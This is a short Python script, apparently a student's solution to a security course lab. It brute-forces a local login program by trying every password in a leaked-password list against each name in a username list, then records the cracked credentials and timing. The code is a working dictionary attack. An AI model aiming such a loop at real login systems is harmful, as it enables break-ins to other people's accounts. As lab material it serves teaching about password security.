import time
import subprocess

# directory: /home/cse/Lab1/Q3/

f = open("/home/cse/Lab1/Q3/PwnedPWs100k")
with open("/home/cse/Lab1/Q3/PwnedPWs100k") as f:
  lines = [line.rstrip('\n') for line in f]
f.close()

f = open("/home/cse/Lab1/Q3/gang")
with open("/home/cse/Lab1/Q3/gang") as f:
  users = [line.rstrip('\n') for line in f]
f.close()

start = time.time()
print(f'start time: {start - start}')

attempts = 0
correct = []
measurement = 300

for i in lines:
  for u in users:
    result = subprocess.run(["python3", "Login.pyc", u, i], capture_output = True, text = True, cwd = "/home/cse/Lab1/Q3/")
    if result.stdout == "Login successful.\n":
      # print(result.stdout)
      print(f'\nusername: {u}\npassword: {i}')
      print(f'time taken: {time.time() - start:.2f}s')
      correct.append(f'{u} - {i} : time taken = {time.time() - start}')
      users.remove(u) # remove user bc their password is taken
  attempts += 1
  if time.time() - start > measurement:
    print(f'\n{measurement/60} minutes have elapsed, on attempt {attempts}')
    measurement += 300
  
print('\nend')
for i in correct:
  print(i)